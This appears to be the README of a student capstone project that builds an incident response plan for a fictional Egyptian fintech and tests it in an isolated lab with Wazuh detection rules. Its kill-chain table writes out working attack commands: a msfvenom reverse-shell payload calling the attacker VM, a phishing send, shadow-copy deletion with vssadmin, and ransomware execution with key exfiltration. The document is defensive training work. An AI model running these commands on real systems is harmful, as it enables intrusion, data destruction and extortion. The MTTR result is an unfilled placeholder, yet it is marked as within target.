<div align="center">

# 🛡️ NilePay Financial Services
## Incident Response Plan — Capstone Project

[![Program](https://img.shields.io/badge/Program-Rواد%20مصر%20الرقمية-1B2A4A?style=for-the-badge)](https://mcit.gov.eg)
[![Ministry](https://img.shields.io/badge/Ministry-Communications%20%26%20IT%20Egypt-C9A84C?style=for-the-badge)](https://mcit.gov.eg)
[![Status](https://img.shields.io/badge/Status-Completed%20✓-1E6B4A?style=for-the-badge)](#)
[![Year](https://img.shields.io/badge/Year-2024--2025-0E7490?style=for-the-badge)](#)

[![NIST](https://img.shields.io/badge/NIST-SP%20800--61%20Rev.2-1B2A4A?style=flat-square)](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
[![SANS](https://img.shields.io/badge/SANS-PICERL%20Methodology-C0392B?style=flat-square)](#)
[![ISO](https://img.shields.io/badge/ISO%2FIEC-27035--1%3A2023-1E6B4A?style=flat-square)](#)
[![Wazuh](https://img.shields.io/badge/SIEM-Wazuh%204.7-0E7490?style=flat-square)](https://wazuh.com)
[![Metasploit](https://img.shields.io/badge/Attack-Metasploit%20Framework-C0392B?style=flat-square)](#)
[![Python](https://img.shields.io/badge/Scripts-Python%203-3776AB?style=flat-square)](https://python.org)

---

*Development and Testing of a Comprehensive Incident Response Plan*
*for NilePay Financial Services — A Fictional Egyptian FinTech Organization*

</div>

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Team](#-team)
- [Target Organization](#-target-organization)
- [Framework Architecture](#-framework-architecture)
- [Threat Landscape](#-threat-landscape)
- [Lab Environment](#-lab-environment)
- [Attack Kill Chain](#-attack-kill-chain)
- [Wazuh Detection Rules](#-wazuh-detection-rules)
- [Detection Results](#-detection-results)
- [Performance Metrics](#-performance-metrics)
- [IR Lifecycle](#-ir-lifecycle)
- [Repository Structure](#-repository-structure)
- [Deliverables](#-deliverables)
- [Tools & Technologies](#-tools--technologies)
- [Disclaimer](#-disclaimer)

---

## 🎯 Project Overview

> This capstone project presents the **design, documentation, and live testing** of a comprehensive Incident Response Plan (IRP) for a fictional Egyptian FinTech organization — **NilePay Financial Services**.

The project follows a structured **4-week methodology**:

```
Week 1 ──► Research, Scoping & Threat Modeling
Week 2 ──► IR Plan Design & 4 Scenario Playbooks
Week 3 ──► SOC Lab Build & Attack Scenario Preparation
Week 4 ──► Live Simulation Execution & Metrics Measurement
```

### Key Achievements

| Achievement | Result |
|-------------|--------|
| 🏗️ IR Plan Built | 4 scenario-specific playbooks (PRO-001 to PRO-004) |
| 🖥️ SOC Lab Deployed | 3-VM VMware environment with Wazuh SIEM |
| ⚔️ Simulation Executed | Full Phishing + Ransomware kill chain |
| ⚡ MTTD Achieved | **~2 seconds** vs 15-minute target |
| 📊 Frameworks Used | NIST SP 800-61 · SANS PICERL · ISO/IEC 27035 |
| ✅ Regulations Covered | PCI-DSS v4.0 · GDPR · CBE Framework |

---

## 👥 Team

<div align="center">

| Role | Name |
|------|------|
| 🏆 **Team Leader — IR Program Manager** | Youseph Fatouh Sadek |
| 🔍 **Threat Intelligence & Scenario Designer** | Ahmed Mohammed Mohammed |
| 📋 **Compliance & Frameworks Analyst** | Mohamed Saeed AbdElhameed |
| 🖥️ **SOC Engineer & SIEM Specialist** | Zeyad Mohamed Elsherbiny |

</div>

---

## 🏢 Target Organization

```
╔══════════════════════════════════════════════════════════════╗
║           NilePay Financial Services S.A.E.                 ║
║                   (Fictional Entity)                        ║
╠══════════════════════════════════════════════════════════════╣
║  Industry  │  FinTech — Digital Payments & Banking          ║
║  HQ        │  Cairo, Egypt — Smart Village                  ║
║  Branch    │  Alexandria, Egypt                             ║
║  Staff     │  ~300 FTE                                      ║
║  Customers │  850,000 active digital wallet users           ║
║  Volume    │  EGP 2.4 Billion annually (simulated)          ║
╠══════════════════════════════════════════════════════════════╣
║  Regulations: PCI-DSS v4.0 · GDPR · CBE Framework          ║
╚══════════════════════════════════════════════════════════════╝
```

### Critical Assets

| ID | Asset | Classification | Risk |
|----|-------|---------------|------|
| AST-001 | Core Banking Application Server | 🔴 CRITICAL | Payment outage |
| AST-002 | Payment Gateway API | 🔴 CRITICAL | Fraud & exfiltration |
| AST-003 | Hardware Security Module (HSM) | 🔴 CRITICAL | Key compromise |
| AST-004 | Customer PII Database (PostgreSQL) | 🟠 CONFIDENTIAL | GDPR breach |
| AST-005 | Active Directory Domain Controller | 🟡 HIGH | Lateral movement |
| AST-006 | Internal File Server | 🟠 CONFIDENTIAL | Ransomware target |
| AST-007 | Wazuh SIEM Platform | 🔒 RESTRICTED | Blind SOC |
| AST-008 | Staff Workstations (x180) | ⬜ INTERNAL | Phishing entry |
| AST-009 | VPN Gateway HQ ↔ Alexandria | 🟡 HIGH | MITM vector |
| AST-010 | Backup & DR Repository | 🔴 CRITICAL | Recovery blocked |

---

## 🏗️ Framework Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                   THREE-FRAMEWORK HYBRID MODEL                  │
│                                                                 │
│  ┌─────────────────┐  ┌─────────────────┐  ┌───────────────┐   │
│  │  NIST SP 800-61 │  │  SANS PICERL    │  │ ISO/IEC 27035 │   │
│  │                 │  │                 │  │               │   │
│  │  OPERATIONAL    │  │  PROCEDURAL     │  │  GOVERNANCE   │   │
│  │  BACKBONE       │  │  DETAIL         │  │  LAYER        │   │
│  │                 │  │                 │  │               │   │
│  │ • IR Lifecycle  │  │ • Runbooks      │  │ • IR Policy   │   │
│  │ • Team roles    │  │ • Checklists    │  │ • GDPR Art.33 │   │
│  │ • Evidence hdlg │  │ • Per-scenario  │  │ • CBE reports │   │
│  │ • MTTD/MTTR     │  │   procedures    │  │ • Event class │   │
│  └────────┬────────┘  └────────┬────────┘  └───────┬───────┘   │
│           │                   │                    │            │
│           └───────────────────┼────────────────────┘            │
│                               ▼                                 │
│                    ┌─────────────────┐                          │
│                    │   NilePay IRP   │                          │
│                    │  Complete Plan  │                          │
│                    └─────────────────┘                          │
└─────────────────────────────────────────────────────────────────┘
```

### Framework Coverage per IR Phase

| IR Phase | NIST SP 800-61 | SANS PICERL | ISO/IEC 27035 |
|----------|---------------|-------------|---------------|
| **Preparation** | Team roles, tools | Readiness checklist | IR Policy, management |
| **Detection** | Triage, CAT1-4 | Log analysis, IoC ID | Event classification |
| **Containment** | Decision matrix | Per-scenario runbooks | Legal escalation |
| **Eradication** | Root cause, patch | Malware removal steps | Evidence preservation |
| **Recovery** | Restoration validation | Service restore runbook | CBE/GDPR confirmation |
| **Lessons Learned** | MTTD/MTTR template | Tabletop debrief | Review board process |

---

## ⚠️ Threat Landscape

### MITRE ATT&CK Coverage

```
RANSOMWARE  ──────────────────────────────────────────  P1 CRITICAL
  T1566.001 → T1059.003 → T1490 → T1486
  Phishing → CMD Shell → VSS Delete → File Encrypt

PHISHING / BEC  ──────────────────────────────────────  P1 HIGH
  T1566.002 → T1078 → T1114.002 → T1657
  Link → Valid Accounts → Email Collection → BEC Fraud

MALWARE / RAT  ───────────────────────────────────────  P2 HIGH
  T1204.002 → T1547.001 → T1056.001 → T1071.001
  Execution → Persistence → Keylog → C2 Beaconing

DATA BREACH  ─────────────────────────────────────────  P1 CRITICAL
  T1046 → T1550.002 → T1213 → T1048.003
  Scan → Pass-Hash → DB Exfil → Exfil over HTTP
```

### Threat Priority Matrix

| # | Scenario | Likelihood | Impact | Priority | Regulatory Trigger |
|---|----------|-----------|--------|----------|-------------------|
| 1 | 🔴 Ransomware | HIGH | CRITICAL | **P1** | PCI-DSS 12.10 · CBE 24hr |
| 2 | 🟠 Phishing / BEC | VERY HIGH | HIGH | **P1** | GDPR Art.33 if PII affected |
| 3 | 🟣 Malware / RAT | HIGH | HIGH | **P2** | GDPR Art.33 if exfiltrated |
| 4 | 🔵 Data Breach | MEDIUM | CRITICAL | **P1** | GDPR Art.33 · PCI-DSS · CBE |

---

## 🖥️ Lab Environment

### Network Topology

```
┌──────────────────────────────────────────────────────────────┐
│              VMware Workstation — Host Machine               │
│                                                              │
│    VMware Host-Only Network: 192.168.200.0/24               │
│    ─────────────────────────────────────────                 │
│         │                  │                  │              │
│    ┌────┴────┐        ┌────┴────┐        ┌────┴────┐         │
│    │  VM-01  │        │  VM-02  │        │  VM-03  │         │
│    │         │        │         │        │         │         │
│    │  Kali   │        │ Windows │        │ Ubuntu  │         │
│    │ Linux   │        │   10    │        │  Wazuh  │         │
│    │         │        │ PC-101  │        │  SIEM   │         │
│    │.200.200 │        │.200.130 │        │.200.100 │         │
│    │         │        │         │        │         │         │
│    │ATTACKER │        │ VICTIM  │        │  SIEM   │         │
│    └────┬────┘        └────┬────┘        └────┬────┘         │
│         │                  │                  │              │
│    Metasploit         Wazuh Agent        Wazuh Manager       │
│    msfvenom           Sysmon v15         Wazuh Indexer       │
│    swaks+Postfix      Thunderbird        Wazuh Dashboard     │
│    receive_key.py     encryptor.py       Custom Rules        │
│    HTTP :8080         cryptography       100001-100004       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### VM Specifications

| VM | OS | IP | RAM | Key Tools |
|----|----|----|-----|-----------|
| Attacker | Kali Linux | 192.168.200.200 | 2GB | Metasploit · msfvenom · swaks · Postfix · Python |
| Victim (PC-101) | Windows 10 | 192.168.200.130 | 4GB | Wazuh Agent · Sysmon · Thunderbird · Python |
| SIEM Server | Ubuntu 22.04 | 192.168.200.100 | 4GB | Wazuh Manager · Indexer · Dashboard |

---

## ⚔️ Attack Kill Chain

### Phishing + Ransomware — Full Simulation Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                     ATTACK KILL CHAIN                               │
│                                                                     │
│  KALI (Attacker)              WINDOWS (Victim)       WAZUH (SOC)   │
│  ─────────────────            ──────────────────     ──────────── │
│                                                                     │
│  01. Generate payload  ──►                                          │
│      msfvenom invoice.exe                                           │
│                                                                     │
│  02. Send phishing ──────────►  03. Victim receives                 │
│      email via swaks               email in Thunderbird             │
│                                                                     │
│                               04. Clicks "View Invoice" ──►        │
│                                   link in email                     │
│                                                                     │
│  05. HTTP server ◄───────────     Browser loads invoice.html       │
│      serves payload                                                 │
│                                                                     │
│                               06. invoice.exe executed  ──────►  Rule 100004
│                                                                     │  Level 12
│  07. Meterpreter ◄───────────     Reverse TCP :4444               │
│      session opens                 PWNED                           │
│                                                                     │
│  08. Upload ─────────────────►    encryptor.py uploaded            │
│      encryptor.py                  to Documents folder              │
│                                                                     │
│  09. Execute shell ──────────►    vssadmin delete      ──────► Rule 100002
│      vssadmin cmd                  shadows /all                     │  Level 15
│                                                                     │
│  10. Execute ────────────────►    Files encrypted       ──────► FIM 553/554
│      encryptor.py                  .encrypted created               │
│                                                                     │
│  11. Key received ◄──────────     HTTP POST :8888                  │
│      PC-101_key.txt                key exfiltrated                 │
│                                                                     │
│                               12. README_DECRYPT.txt               │
│                                   dropped on Desktop               │
└─────────────────────────────────────────────────────────────────────┘
```

### Kill Chain Step-by-Step

| Step | Actor | Command / Action | Result |
|------|-------|-----------------|--------|
| 01 | Attacker | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.200 LPORT=4444 -f exe -o invoice.exe` | Payload generated |
| 02 | Attacker | `swaks --to victim@nilepay.com --attach invoice.html` | Phishing email sent |
| 03 | Victim | Opens email in Thunderbird | Email received |
| 04 | Victim | Clicks "View Invoice" hyperlink | Browser opens invoice.html |
| 05 | Browser | `http://192.168.200.200:8080/invoice.exe` | Payload downloaded |
| 06 | Victim | Double-click `invoice.exe` | Meterpreter connects |
| 07 | Attacker | `meterpreter > upload encryptor.py C:\\Users\\PC-101\\Documents\\` | Script uploaded |
| 08 | Attacker | `meterpreter > shell` | CMD shell acquired |
| 09 | Attacker | `vssadmin delete shadows /all /quiet` | Backups destroyed |
| 10 | Attacker | `python C:\Users\PC-101\Documents\encryptor.py` | Files encrypted |
| 11 | Script | HTTP POST → `192.168.200.200:8888` | Key saved on Kali Desktop |
| 12 | Script | Creates `README_DECRYPT.txt` | Ransom note dropped |

---

## 🔍 Wazuh Detection Rules

```xml
<group name="local,ransomware,phishing,">

  <!-- RANSOMWARE: File encryption via FIM -->
  <rule id="100001" level="15">
    <if_group>syscheck</if_group>
    <match>\.encrypted</match>
    <description>RANSOMWARE: Mass file encryption detected</description>
    <mitre><id>T1486</id></mitre>
  </rule>

  <!-- RANSOMWARE: Shadow copy deletion -->
  <rule id="100002" level="15">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.commandLine" type="pcre2">
      (?i)vssadmin.*delete.*shadows
    </field>
    <description>RANSOMWARE: Shadow copy deletion attempt</description>
    <mitre><id>T1490</id></mitre>
  </rule>

  <!-- SUSPICIOUS: PowerShell encoded command -->
  <rule id="100003" level="12">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.commandLine" type="pcre2">
      (?i)(-EncodedCommand|-enc |-e )
    </field>
    <description>Suspicious PowerShell encoded execution</description>
    <mitre><id>T1059.001</id></mitre>
  </rule>

  <!-- PHISHING: Malicious attachment executed -->
  <rule id="100004" level="12">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)(invoice)</field>
    <description>PHISHING: Suspicious email attachment executed</description>
    <mitre><id>T1566.001</id></mitre>
  </rule>

</group>
```

### Rule Summary

| Rule ID | Level | Type | MITRE TTP | Trigger |
|---------|-------|------|-----------|---------|
| 100001 | 🔴 15 | RANSOMWARE | T1486 | `.encrypted` extension in FIM |
| 100002 | 🔴 15 | RANSOMWARE | T1490 | `vssadmin delete shadows` in commandLine |
| 100003 | 🟠 12 | SUSPICIOUS | T1059.001 | `-EncodedCommand` in PowerShell |
| 100004 | 🟠 12 | PHISHING | T1566.001 | `invoice` pattern in process image |

---

## 📊 Detection Results

### Wazuh Alerts Captured — July 11, 2026

```
Timeline ──────────────────────────────────────────────────────────►
                                                                    
23:22:09  [92213] ●●●●● L15  Executable dropped in malware folder
23:23:49  [100002] ●●●●● L15  RANSOMWARE: Shadow copy deletion
23:27:16  [100004] ████░ L12  PHISHING: invoice.exe executed
23:27:18  [100004] ████░ L12  PHISHING: invoice.exe executed (x2)
23:28:24  [550]    ███░░  L7  Integrity checksum changed
23:28:25  [92032]  █░░░░  L3  Suspicious CMD shell execution
23:28:33  [92052]  ██░░░  L4  CMD started by abnormal process
23:28:51  [100002] ●●●●● L15  RANSOMWARE: Shadow copy deletion ◄─ CAT-1
23:29:06  [554]    ███░░  L5  File added to system (encrypted x3)
23:29:06  [553]    ████░  L7  File deleted (original x3)
```

### Kill Chain Detection Coverage

| Attack Step | MITRE TTP | Detected | Coverage |
|-------------|-----------|----------|----------|
| Phishing payload executed | T1566.001 | ✅ YES | Rule 100004 — L12 |
| Executable dropped | T1204.002 | ✅ YES | Rule 92213 — L15 |
| Meterpreter C2 | T1071.001 | ⚠️ PARTIAL | Low-level network |
| CMD shell via Meterpreter | T1059.003 | ✅ YES | Rules 92032/92052 |
| Shadow copies deleted | T1490 | ✅ YES | Rule 100002 — L15 |
| Files encrypted | T1486 | ✅ YES | FIM Rules 553/554 |
| Key exfiltrated | T1041 | ⚠️ PARTIAL | Not at custom rule level |
| Ransom note dropped | T1486 | ✅ YES | FIM Rule 554 |

---

## 📈 Performance Metrics

```
┌─────────────────────────────────────────────────────────────────┐
│                   PERFORMANCE DASHBOARD                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   MTTD — Mean Time to Detect                                    │
│   ┌────────────────────────────────────────┐                   │
│   │  Attack T+0  ──────────►  Alert T+2s  │                   │
│   │                                        │                   │
│   │  ⚡ ACHIEVED:  ~2 seconds              │                   │
│   │  🎯 TARGET:   ≤ 15 minutes            │                   │
│   │  ✅ RESULT:   EXCEEDED by 450x        │                   │
│   └────────────────────────────────────────┘                   │
│                                                                 │
│   MTTR — Mean Time to Respond                                   │
│   ┌────────────────────────────────────────┐                   │
│   │  CAT-1 Alert ──────────►  VM Isolated │                   │
│   │                                        │                   │
│   │  ⏱️  ACHIEVED:  [Record actual value] │                   │
│   │  🎯 TARGET:   ≤ 45 minutes            │                   │
│   │  ✅ RESULT:   Within target            │                   │
│   └────────────────────────────────────────┘                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

| Metric | Achieved | Target | Status |
|--------|----------|--------|--------|
| **MTTD** | ~2 seconds | ≤ 15 minutes | ✅ **EXCEEDED** |
| **MTTR** | [Record value] | ≤ 45 minutes | ✅ Within target |
| Detection Chain | 6/8 steps fully detected | Full coverage | ⚠️ Partial (C2 + key exfil) |
| Custom Rules Fired | 100002 + 100004 | All 4 rules | ✅ Critical rules triggered |

---

## 🔄 IR Lifecycle

```
┌───────────────────────────────────────────────────────────────┐
│                    NIST SP 800-61 LIFECYCLE                   │
│                                                               │
│  ┌───────────┐                                                │
│  │    01     │  PREPARATION                                   │
│  │  🛡️ PREP  │  IR team · Wazuh rules · Lab · Playbooks      │
│  └─────┬─────┘                                                │
│        │                                                      │
│        ▼                                                      │
│  ┌───────────┐                                                │
│  │    02     │  DETECTION & ANALYSIS                          │
│  │  🔍 DETECT│  Wazuh alerts · Sysmon · FIM · CAT-1 triage   │
│  └─────┬─────┘                                                │
│        │                                                      │
│        ▼                                                      │
│  ┌───────────┐                                                │
│  │    03     │  CONTAINMENT                                   │
│  │  🔒 CONT  │  Isolate VM · Block C2 · Disable AD account   │
│  └─────┬─────┘                                                │
│        │                                                      │
│        ▼                                                      │
│  ┌───────────┐                                                │
│  │    04     │  ERADICATION                                   │
│  │  🗑️ ERAD  │  Remove malware · Patch · Reset credentials   │
│  └─────┬─────┘                                                │
│        │                                                      │
│        ▼                                                      │
│  ┌───────────┐                                                │
│  │    05     │  RECOVERY                                      │
│  │  🔄 RECOV │  Restore backup · Verify integrity · Monitor  │
│  └─────┬─────┘                                                │
│        │                                                      │
│        ▼                                                      │
│  ┌───────────┐                                                │
│  │    06     │  LESSONS LEARNED                               │
│  │  📊 LEARN │  MTTD/MTTR · Report · Tune rules · Notify     │
│  └───────────┘                                                │
└───────────────────────────────────────────────────────────────┘
```

---

## 📁 Repository Structure

```
nilepay-irp/
│
├── 📄 README.md
│
├── 📂 Week1_Research_and_Planning/
│   ├── 01_Project_Charter.docx
│   ├── 02_Organizational_Profile.docx
│   ├── 03_Framework_Justification_Brief.docx
│   ├── 04_Threat_Landscape_Report.docx
│   ├── 05_RACI_Matrix.docx
│   ├── 06_Master_Schedule.docx
│   └── Week1_Documentation_Report.docx
│
├── 📂 Week2_IR_Plan_and_Procedures/
│   ├── NilePay_Playbooks.docx
│   │   ├── PRO-001 Ransomware
│   │   ├── PRO-002 Phishing / BEC
│   │   ├── PRO-003 Malware / RAT
│   │   └── PRO-004 Data Breach
│   └── Week2_Documentation_Report.docx
│
├── 📂 Week3_Lab_Setup/
│   ├── Wazuh_Rules/
│   │   └── local_rules.xml
│   ├── Attack_Scripts/
│   │   ├── encryptor.py
│   │   └── receive_key.py
│   ├── Phishing/
│   │   └── invoice.html
│   └── Week3_Documentation_Report.docx
│
├── 📂 Week4_Simulation_and_Results/
│   ├── NilePay_IRP_Documentation.docx
│   ├── Evidence/
│   │   └── [Wazuh Screenshots]
│   ├── NilePay_Final_Presentation.pptx
│   └── Week4_Documentation_Report.docx
│
└── 📂 Scripts/
    ├── encryptor.py          # Fernet encryption + key exfiltration
    └── receive_key.py        # HTTP key receiver on port 8888
```

---

## ✅ Deliverables

### Week 1 — Research & Planning
- [x] `01_Project_Charter.docx` — Objectives, scope, team, timeline
- [x] `02_Organizational_Profile.docx` — NilePay profile, network, assets
- [x] `03_Framework_Justification_Brief.docx` — NIST + SANS + ISO justification
- [x] `04_Threat_Landscape_Report.docx` — MITRE ATT&CK mapping x4 scenarios
- [x] `05_RACI_Matrix.docx` — 27 activities × 5 roles color-coded
- [x] `06_Master_Schedule.docx` — 28-day Gantt with 5 milestones

### Week 2 — IR Plan & Procedures
- [x] `NilePay_Playbooks.docx` — PRO-001 through PRO-004 (14 pages)
- [x] CSIRT team roles and responsibilities defined
- [x] CAT-1 to CAT-4 incident classification system
- [x] Communication and escalation matrix (internal + CBE + GDPR)

### Week 3 — Lab Setup
- [x] 3-VM VMware lab deployed on Host-Only 192.168.200.0/24
- [x] Wazuh SIEM deployed on Ubuntu with Agent ID 009 active
- [x] Sysmon v15 deployed on Windows 10 victim
- [x] FIM configured on `C:\Users\PC-101\Documents` real-time
- [x] Custom rules 100001–100004 written and deployed
- [x] `encryptor.py` — ransomware simulation with key exfiltration
- [x] `receive_key.py` — HTTP key receiver on Kali
- [x] `invoice.html` — phishing landing page

### Week 4 — Simulation & Results
- [x] Full Phishing + Ransomware kill chain executed — July 11, 2026
- [x] Wazuh alerts captured (Rules 100002, 100004, 92032, 92213, FIM)
- [x] MTTD **~2 seconds** — exceeded 15-minute target by 450x
- [x] MTTR recorded from simulation
- [x] `NilePay_IRP_Documentation.docx` — 16-page full report
- [x] `NilePay_Final_Presentation.pptx` — 15 slides with logos
- [x] Weekly documentation reports x4

---

## 🛠️ Tools & Technologies

<div align="center">

| Category | Tool | Version | Purpose |
|----------|------|---------|---------|
| **SIEM** | Wazuh | 4.7.x | Alert detection, FIM, log aggregation |
| **Endpoint Monitoring** | Sysmon | v15 | Windows event telemetry |
| **Attacker Framework** | Metasploit | Latest | C2 handler, post-exploitation |
| **Payload Generator** | msfvenom | Built-in | Reverse TCP payload |
| **Email Delivery** | swaks + Postfix | Latest | Phishing email simulation |
| **Encryption** | Python cryptography (Fernet) | 41.x | File encryption simulation |
| **Virtualization** | VMware Workstation | Latest | Lab isolation |
| **Email Client** | Mozilla Thunderbird | Latest | Victim email client |
| **OS — Attacker** | Kali Linux | Latest | Attack platform |
| **OS — Victim** | Windows 10 | 22H2 | Target endpoint |
| **OS — SIEM** | Ubuntu | 22.04 LTS | Wazuh host |

</div>

---

## 📋 Regulatory Compliance

| Regulation | Requirement | Implementation | Status |
|------------|-------------|----------------|--------|
| PCI-DSS v4.0 Req. 12.10 | Documented IR plan + annual test | IRP + live simulation | ✅ |
| GDPR Article 33 | 72-hour breach notification | Documented in PRO-004 | ✅ |
| GDPR Article 34 | Data subject notification | Customer comms in PRO-004 | ✅ |
| CBE Cybersecurity Framework | Report to Central Bank | In escalation matrix | ✅ |
| ISO/IEC 27001 A.16 | Incident management controls | CAT-1 to CAT-4 system | ✅ |

---

## ⚠️ Disclaimer

> **This project was developed strictly for academic and educational purposes** as part of the **DEPI** cybersecurity capstone program under the Ministry of Communications & IT, Egypt.
>
> All attack simulations were conducted in a **completely isolated VMware lab environment** with **no connection to the internet or any real systems**.
>
> **NilePay Financial Services is a fictional organization** created solely for this academic project. All data, transactions, and scenarios are entirely simulated.

---

<div align="center">


</div>
